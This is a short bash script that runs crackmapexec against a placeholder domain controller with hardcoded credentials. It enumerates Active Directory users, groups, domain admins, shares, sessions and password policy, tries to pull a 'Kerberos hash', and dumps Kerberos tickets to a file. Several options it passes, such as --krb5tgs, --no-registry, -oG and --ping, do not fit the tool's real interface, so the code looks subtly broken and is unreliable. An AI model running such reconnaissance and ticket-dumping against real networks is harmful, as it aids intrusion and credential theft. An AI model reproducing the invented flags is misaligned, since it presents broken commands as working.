#!/bin/bash

# Parse command line options
while getopts "N" opt; do
  case $opt in
    N)
      NOPASS="--no-pass"
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
  esac
done

# Set the target domain and domain controller
DOMAIN="example.com"
DC="dc.example.com"

# Set the username and password for the enumeration
USER="user"
PASSWORD="password"

# Get the user's Kerberos hash
HASH=$(crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS | grep 'HASH.*NTLM' | awk '{print $3}')

# Enumerate users
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --users > users.txt

# Enumerate groups
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --groups > groups.txt

# Enumerate domain admins
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --groups | grep -i 'domain admins' | awk '{print $1}' > domain_admins.txt

# Enumerate computers
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --no-bruteforce --no-registry --no-wmi --no-mssql --no-snmp --no-winrm -oG computers.gnmap

# Enumerate shares
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --shares > shares.txt

# Enumerate domain users with password policy information
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --users --pass-pol > users_with_password_policy_info.txt

# Enumerate Kerberos tickets
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --kerberos > kerberos_tickets.txt

# Dump Kerberos tickets
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --krb5tgs > tickets.kirbi

# Enumerate open SMB sessions
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --sessions > sessions.txt

# Enumerate computers
crackmapexec smb $DC -u $USER -p $PASSWORD $NOPASS --ping > computers.txt

# Enumerate local groups on each computer
for computer in $(cat computers.txt); do
    crackmapexec smb $computer -u $USER -p $PASSWORD --local-groups > "local_groups_$computer.txt"
done
